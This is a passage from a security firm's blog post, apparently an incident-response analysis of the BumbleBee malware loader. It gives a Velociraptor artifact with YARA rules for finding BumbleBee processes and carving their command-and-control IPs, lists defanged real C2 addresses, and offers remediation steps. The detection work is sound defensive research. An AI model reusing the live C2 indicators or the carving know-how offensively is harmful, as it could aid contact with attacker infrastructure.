                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/6/e/csm_sec-consult-c-Image_9_0ba6abff00.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/6/e/csm_sec-consult-c-Image_9_61450d2f6a.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/6/e/csm_sec-consult-c-Image_9_55a47f8eac.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/6/e/csm_sec-consult-c-Image_9_d23f104159.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/6/e/csm_sec-consult-c-Image_9_e758e7143e.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/6/e/csm_sec-consult-c-Image_9_172c0a8c6d.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/6/e/csm_sec-consult-c-Image_9_a2c5af845a.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/6/e/csm_sec-consult-c-Image_9_a8fe29e147.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/6/e/csm_sec-consult-c-Image_9_83325b6fef.png" width="1100" height="132" alt="Output produced by the SEC Defence Velociraptor artifact" /></picture></a></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><h4>Velociraptor</h4><p class="MsoBodyText">To automatically extract the C2 server addresses &nbsp;from the malware, SEC Defence created&nbsp; further Velociraptor artifacts that firstly detects BumbleBee processes and secondly extracts the IP addresses which have port 443 associated.</p><pre><code>name: Custom.Windows.Carving.BumbleBee
author: "Angelo Violetti (SEC Consult - SEC Defence)"
type: CLIENT
description: |
        This artficat will detect running BumbleBee processes and subsequently extract the command and control servers with the destination port 443.
reference: <a href="https://sec-consult.com/incident-response/sec-defence/" target="_blank">sec-consult.com/incident-response/sec-defence/</a>
parameters:
  - name: TargetFileGlob
    default:
  - name: PidRegex
    default: .
  - name: ProcessRegex
    default: .
  - name: DetectionYara
    default: |
        rule BumbleBee_Unpacked{
            meta:
                author = "Angelo Violetti @ SEC Defence"
                date = "2023-02-23"
            
            strings:
                $s1 = {?? 83 ?? 18 10 72 03 ?? 8B ?? 44 8B ?? 48 8B ?? 48 8D 4C 24 30 E8 ?? ?? FF FF 90}
                $s2 = {48 8D 4C 24 30 E8 ?? ?? FF FF 90}
                $s3 = {48 8d 4c 24 30 e8 ?? ?? FF FF}
            
            condition:
                all of ($s*)
        }
        
  - name: ExtractIPsYara
    default: |
        rule BumbleBee_IPs{
            meta:
                author = "Angelo Violetti @ SEC Defence"
                date = "2023-02-23"
                description = "Extracts the IP addresses with the destination port equal to 443 from BumbleBee processes"
            
            strings:
            $IP = {?? ?? ?? 2e ?? ?? ?? 2e ?? ?? ?? 2e ?? ?? ?? 00 (?? | ?? ??) 00 00 00 00 00 00 00 0f 00 00 00 00 00 00 00 34 34 33 00 00 00 00 00 00 00 00 00 00 00 00 00 03 00 00 00 00 00 00 00 0F 00 00 00 00 00 00 00}
          condition:
            $IP
        }

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        -- Find velociraptor process
        LET me = SELECT Pid
                  FROM pslist(pid=getpid())

        -- Find all processes and add filters
        LET processes = SELECT Name AS ProcessName, CommandLine, Pid
                        FROM pslist()
                        WHERE Name =~ ProcessRegex
                            AND format(format="%d", args=Pid) =~ PidRegex
                            AND NOT Pid in me.Pid

        -- Scan processes in scope with our DetectionYara
        LET processDetections = SELECT * FROM foreach(row=processes,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob="",
                                        then={
                                            SELECT *, ProcessName, CommandLine, Pid, Rule AS YaraRule
                                            FROM proc_yara(pid=Pid, rules=DetectionYara)
                                        })
                                })
                                
        -- Scan the process for the IP addresses
        LET ipaddressDetections = SELECT ProcessName, CommandLine, Pid, Strings.Data AS IPAddresses FROM foreach(row=processDetections, query={SELECT *, ProcessName, CommandLine, Pid FROM proc_yara(pid=Pid, rules=ExtractIPsYara)})
        
        -- Extract the command and control servers
        LET CommandandControlServers = SELECT * FROM foreach(row=ipaddressDetections, query={SELECT ProcessName, CommandLine, Pid, g1 FROM parse_records_with_regex(accessor="data", file=IPAddresses, regex='''(\d+\.\d+\.\d+\.\d+)''')})

        -- Output the command and control servers
        SELECT ProcessName, CommandLine, Pid, str(str=g1) AS BumbleBeeC2 FROM CommandandControlServers
</code></pre><p class="MsoBodyText">The following image shows the output produced by the SEC Defence Velociraptor artifact.</p><p>&nbsp;</p></div></div></div></section><section class="section section__textpic"><div id="c4010" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_04/sec-consult-c-Image_10.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/8/5/csm_sec-consult-c-Image_10_5f7b9a9fb8.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/8/5/csm_sec-consult-c-Image_10_84e7fad2be.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/8/5/csm_sec-consult-c-Image_10_7a0951387d.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/8/5/csm_sec-consult-c-Image_10_3e5ea84c78.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/8/5/csm_sec-consult-c-Image_10_7ed1a8aa9f.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/8/5/csm_sec-consult-c-Image_10_c1c86cb2f8.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/8/5/csm_sec-consult-c-Image_10_f1d0de5d46.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/8/5/csm_sec-consult-c-Image_10_ab5a3a1746.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/8/5/csm_sec-consult-c-Image_10_c1c8bd99c9.png" width="1100" height="363" alt="Network Traffic Analysis" /></picture></a></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><h4>Network Traffic Analysis</h4><p class="MsoBodyText">Another method to detect connections to C2 servers is by integrating and constantly updating Cyber Threat Intelligence feeds and detection rules with network security technologies.</p></div></div></div></section><section class="section section__text"><div id="c4011" class="frame frame-default frame-type-text frame-layout-0"><p class="MsoBodyText">In this specific case, the following Proofpoint Emerging Threat Rules were triggered:</p><ul class="list-normal"><li class="MsoBodyText">ET CNC Feodo Tracker Reported CnC Server group 1: 103[.]144[.]139[.]146</li><li class="MsoBodyText">ET CNC Feodo Tracker Reported CnC Server group 10: 205[.]185[.]113[.]34</li><li class="MsoBodyText">ET CNC Feodo Tracker Reported CnC Server group 11: 23[.]106[.]223[.]222</li><li class="MsoBodyText">ET CNC Feodo Tracker Reported CnC Server group 25: 95[.]168[.]191[.]248</li></ul><h2 class="MsoBodyText">Suggested Remediation / Other Actions</h2><ul class="list-normal"><li class="MsoBodyText">Proactively hunt at scale for the subsequent actions that could have been performed by the threat actors after having compromised the patient zero (e.g., discovery, credential access, lateral movement, etc.).</li><li class="MsoBodyText">Isolate, where possible, the compromised systems to contain the incident and prevent the spread of the infection.</li><li class="MsoBodyText">Block the indicators of compromise (IoCs) identified during the analysis and, eventually, insert in blacklists also the indicators reported on OSINT sources like <a href="https://bazaar.abuse.ch/browse/signature/BumbleBee/" target="_blank" rel="noreferrer">Malware Bazaar</a>, <a href="https://feodotracker.abuse.ch/browse/bumblebee/" target="_blank" rel="noreferrer">Feodo Tracker</a>, etc.</li><li class="MsoBodyText">If support in handling the incident is needed, contact the incident response team.</li></ul><h2>Conclusion</h2><p class="MsoBodyText">By analyzing the tactics, techniques and procedures adopted by BumbleBee, SEC Defence identified and created mechanisms to detect the malware in the early stages of the attack with the aim objective to minimize further potential impacts such as data exfiltration and/or encryption.</p><p class="MsoBodyText">As stated by other companies (<a href="https://www.youtube.com/watch?v=pIXl79IPkLI" target="_blank" rel="noreferrer">Mandiant</a>, <a href="https://www.intrinsec.com/emotet-returns-and-deploys-loaders/" target="_blank" rel="noreferrer">Intrisec</a>), the threat actors behind BumbleBee have a strong relationship with other malware families like Emotet or IcedID and ransomware groups. Therefore, proactively hunting for BumbleBee activities or applying the right remediation actions in time can prevent the execution of other malicious executables that could cause service unavailability or impact the confidentiality and integrity of data.</p><p>&nbsp;</p><p>&nbsp;</p></div></section><section class="section section__text"><div id="c4012" class="frame frame-default frame-type-text frame-layout-0"><p><em><sup>1</sup>&nbsp;Initial access brokers are cyber-criminals that sell access to compromised infrastructures to other groups with the aim to obtain a financial gain.<br><sup>2</sup>&nbsp;Sysmon (System Monitor) is a Windows service that allows logging a wide range of activities performed on a system such as process creation, network connections or file changes.</em></p><p>&nbsp;</p><p><em>Repositories:</em></p><p><em>Sigma:&nbsp;<a href="https://github.com/angelovioletti/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_ext_drive.yml" target="_blank" title="https://github.com/angelovioletti/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_ext_drive.yml" rel="noreferrer">https://github.com/angelovioletti/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_ext_drive.yml</a></em></p><p><em>Velociraptor:&nbsp;<a href="https://github.com/Velocidex/velociraptor-docs/blob/d891bf8671230437b2b4497649c28b9a6045252b/content/exchange/artifacts/BumbleBee.yaml" target="_blank" title="https://github.com/Velocidex/velociraptor-docs/blob/d891bf8671230437b2b4497649c28b9a6045252b/content/exchange/artifacts/BumbleBee.yaml" rel="noreferrer">https://github.com/Velocidex/velociraptor-docs/blob/d891bf8671230437b2b4497649c28b9a6045252b/content/exchange/artifacts/BumbleBee.yaml</a></em></p><p>Yara:&nbsp;<a href="https://github.com/sec-consult/SD-BumbleBee-Hunting-Rules/blob/main/BumbleBee_Unpacked.yara" target="_blank" title="https://github.com/sec-consult/SD-BumbleBee-Hunting-Rules/blob/main/BumbleBee_Unpacked.yara" rel="noreferrer">https://github.com/sec-consult/SD-BumbleBee-Hunting-Rules/blob/main/BumbleBee_Unpacked.yara</a></p></div></section><section class="section section__text"><div id="c4013" class="frame frame-default frame-type-text frame-layout-0"><p class="text-center"><strong><em>This research has been conducted by Angelo Violetti and published on behalf of&nbsp; <a href="/incident-response/sec-defence/#c446">SEC Defence</a>.&nbsp;</em></strong></p></div></section><section class="section section__call_to_action"><div id="c4014" class="frame frame-default frame-type-call_to_action frame-layout-0"><div class="cta"><div class="cta__left"><div class=""><header><h3 >
                Are you interested in working at SEC Consult?
            </h3></header></div>
    



            SEC Consult is always searching for talented security professionals to work in our team.
        </div><div class="cta__right"><a href="/career/#c2854" class="cta__btn">
                More Information 
            </a></div></div></div></section><section class="section section__sec_consult_base_container-2ColumnContainer"><div id="c4262" class="frame frame-default frame-type-sec_consult_base_container-2ColumnContainer frame-layout-0"><div class="row"><div class="col-md-6"></div><div class="col-md-6"></div></div></div></section><div class="news-detail__back-link-wrap"><a class="news-detail__back-link" href="/blog/">
                    Back
                </a></div></div></div></div></div></section><!--TYPO3SEARCH_end--></div></section><footer class="footer"><div class="footer-top"><div class="footer__container"><div class="footer__row"><div class="footer__col footer__col--4"><nav><ul class="footer-nav"><li class="footer-nav__item"><a class="footer-nav__link" href="/legalnotice/">Legal Notice</a></li><li class="footer-nav__item"><a class="footer-nav__link" href="/privacy-statement/">Privacy Statement</a></li><li class="footer-nav__item"><a class="footer-nav__link" href="/career/">Jobs</a></li></ul></nav></div><div class="footer__col footer__col--8"><p class="footer-text">
                        
                        
                        
                        
                        
                        
                        
                        SEC Consult is one of the leading consultancies in the field of cyber and <a href="/security-testing/web-application-security/" target="_blank" title="Web Application Security">application security</a>. The company specializes in <a href="/processes-organisation/information-security-management-ism/" target="_blank" title="Information Security Management (ISM)">information security management</a>, <a href="/processes-organisation/network-and-information-systems-security-nis/" target="_blank" title="NIS security audits">NIS security audits</a>, <a href="/security-testing/penetration-testing/" target="_blank" title="Pentesting (Pentest)">penetration testing</a>, ISO 27001 certification support, <a href="/incident-response/sec-defence/" target="_blank" title="Cyber Defence">Cyber Defence</a> and <a href="/processes-organisation/secure-software-development/" target="_blank" title="Secure Software Development Consulting">secure software certification</a>. SEC Consult is part of <a href="https://eviden.com/" target="_blank" title="Link to Eviden website" rel="noreferrer">Eviden</a>.
                    </p></div></div></div></div><div class="footer-middle"><div class="footer__container"><div class="footer-logos"><a title="About us" href="/about-us/"><img class="lazyload" alt="bsi ISO/IEC 27001 Information Security Management CERTIFIED" loading="lazy" src="/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png" width="140" height="80" /></a><a title="About us" href="/about-us/"><img class="lazyload" alt="ISO 27001 CREST certified" loading="lazy" src="/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png" width="67" height="80" /></a><a title="About us" href="/about-us/"><img class="lazyload" alt="Great Place To Work AT certified" loading="lazy" src="/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png" width="47" height="80" /></a><a title="About us" href="/about-us/"><img class="lazyload" alt="Great Place To Work DE certified" loading="lazy" src="/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png" width="47" height="80" /></a></div></div></div><div class="footer-bottom"><div class="footer__container"><nav><ul class="footer-social"><li class="footer-social__item"><a class="footer-social__link" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/sec_consult"><span class="i-twitter"></span></a></li><li class="footer-social__item"><a class="footer-social__link" title="Linkedin" rel="noopener noreferrer" href="https://www.linkedin.com/company/sec-consult"><span class="i-linkedin"></span></a></li><li class="footer-social__item"><a class="footer-social__link" title="Xing" rel="noopener noreferrer" href="https://www.xing.com/companies/secconsultunternehmensberatunggmbh"><span class="i-xing"></span></a></li><li class="footer-social__item"><a class="footer-social__link" href="/contact/"><span class="i-mail-alt"></span></a></li></ul></nav></div></div></footer></div>

<div class="tx-ls-cookie-consent">
    
    <div class="cookie-panel" data-lscookie-panel="1">
        <div class="cookie-panel__inner">
            <button class="cookie-panel__close" title="Close" data-lscookie-close>
                <span class="cookie-panel__close--one"></span>
                <span class="cookie-panel__close--two"></span>
            </button>
            <div class="cookie-panel__panel">
                <h2 class="c-p-header">We use Cookies</h2>
                <div class="c-p-description">
                    <p>We use cookies to offer you a perfect visit experience. These include cookies that are necessary for the operation of the site and for the control of our commercial corporate goals, as well as those that are only used for anonymous statistical purposes, for convenience settings or to display personalized content. Decide for yourself which categories you want to allow. Please note that based on your settings, not all functions of the site may be available.</p>
<p><strong><a href="/legalnotice/">Legal Notice</a></strong><strong>&nbsp;</strong> •&nbsp; <strong><a href="/privacy-statement/">Privacy Statement</a></strong></p>
                </div>
                
                <form class="c-p-selection">
                    
                        <div class="c-p-group">
                            <div class="c-p-group__header">
                                <div class="c-p-group__header-left">
                                    <div class="c-p-group__name">
                                        <h3>
                                            Technically required
                                        </h3>
                                        <span>
                                            (
                                                0
                                                Service
                                            )
                                        </span>
                                    </div>
                                    
                                </div>
                                <div class="c-p-group__header-right">
                                    <div class="checkbox checkbox--labeled-slider checkbox--disabled">
                                        <span>no</span>
                                        <input
                                            class="checkbox-input"
                                            autocomplete="off" data-lscookie-grp="group-1" id="group-1" type="checkbox"
                                            checked disabled value="group-1" />
                                        <label class="checkbox-label--switch" for="group-1">
                                            <span class="sr-only">
                                                Technically required (
                                                0
                                                Service
                                                )
                                            </span>
                                        </label>
                                        <div class="checkbox-slider__switch checkbox-slider__switch--labeled">

                                        </div>
                                        <span>yes</span>
                                    </div>
                                </div>
                            </div>
                            
                        </div>
                    
                        <div class="c-p-group">
                            <div class="c-p-group__header">
                                <div class="c-p-group__header-left">
                                    <div class="c-p-group__name">
                                        <h3>
                                            Analysis / statistics
                                        </h3>
                                        <span>
                                            (
                                                1
                                                Service
                                            )
                                        </span>
                                    </div>
                                    <p>Anonymous evaluation for troubleshooting and further development</p>
                                </div>
                                <div class="c-p-group__header-right">
                                    <div class="checkbox checkbox--labeled-slider">
                                        <span>no</span>
                                        <input
                                            class="checkbox-input"
                                            autocomplete="off" data-lscookie-grp="group-2" id="group-2" type="checkbox"
                                             value="group-2" />
                                        <label class="checkbox-label--switch" for="group-2">
                                            <span class="sr-only">
                                                Analysis / statistics (
                                                1
                                                Service
                                                )
                                            </span>
                                        </label>
                                        <div class="checkbox-slider__switch checkbox-slider__switch--labeled">

                                        </div>
                                        <span>yes</span>
                                    </div>
                                </div>
                            </div>
                            
                                <div class="c-p-group__cookies">
                                    
                                        <div class="c-p-cookie">
                                            <div class="c-p-cookie__top">
                                                <h4>Matomo</h4>
                                                <div class="checkbox checkbox--labeled-slider">
                                                    <span>no</span>
                                                    <input
                                                        class="checkbox-input"
                                                        autocomplete="off" data-lscookie-parent="group-2" data-lscookie-cookie="cookie-5" id="cookie-5"
                                                        type="checkbox"  value="cookie-5" />
                                                    <label class="checkbox-label--switch" for="cookie-5"><span class="sr-only">Matomo</span></label>
                                                    <div class="checkbox-slider__switch checkbox-slider__switch--labeled">
                                                    </div>
                                                    <span>yes</span>
                                                </div>
                                            </div>
                                            <div class="c-p-cookie__bottom">
                                                <span>Matomo.org</span>
                                                
                                                    <a href="#" class="c-p-cookie__toggle" data-lscookie-toggle="#detail5">
                                                        <span class="c-p-cookie__toggle-show">
                                                            Show details
                                                        </span>
                                                        <span class="c-p-cookie__toggle-hide">
                                                            Hide details
                                                        </span>
                                                    </a>
                                                
                                            </div>
                                            <div class="c-p-cookie__detail" id="detail5">
                                                <p><strong>Purpose</strong>: Error analysis, statistical evaluation of our website accesses, campaign analysis, conversion tracking.<br> <strong>Processing operations</strong>: collection of access data, data from your browser and data about the content accessed; execution of analysis software and storage of data on your terminal device, anonymization of the data collected; evaluation of the anonymous data in the form of statistics.<br> <strong>Storage period</strong>: 1 year.<br> <strong>Joint controller</strong>: LimeSoda Interactive Marketing GmbH.<br> <strong>Legal basis for data processing</strong>: Art. 6 para. 1 lit. f of the DSGVO.<br> <strong>Consequences of non-consent</strong>: This basic tracking is absolutely necessary for the operation of our website.<br> <strong>Data transfer</strong>: The data collected with Matomo is stored on our own servers. It is not passed on to third parties.</p>
                                                <p></p>
                                            </div>
                                        </div>
                                    
                                </div>
                            
                        </div>
                    
                </form>
            </div>
            <div class="c-p-controls">
                <button data-lscookie-save class="c-p-btn--secondary">
                    Accept selected
                </button>
                <button data-lscookie-save data-lscookie-grp="none" class="c-p-btn--secondary">
                    Reject all
                </button>
                <button data-lscookie-save data-lscookie-grp="all" class="c-p-btn--secondary">
                    Accept all
                </button>
            </div>
        </div>
    </div>

</div>



<script src="/typo3temp/assets/compressed/merged-f656b3463ffe171b7f5a15185a0bcaa3-ebc8a57b2617c501924eccc747d2e697.js?1733121259" type="text/javascript"></script>



</body>
</html>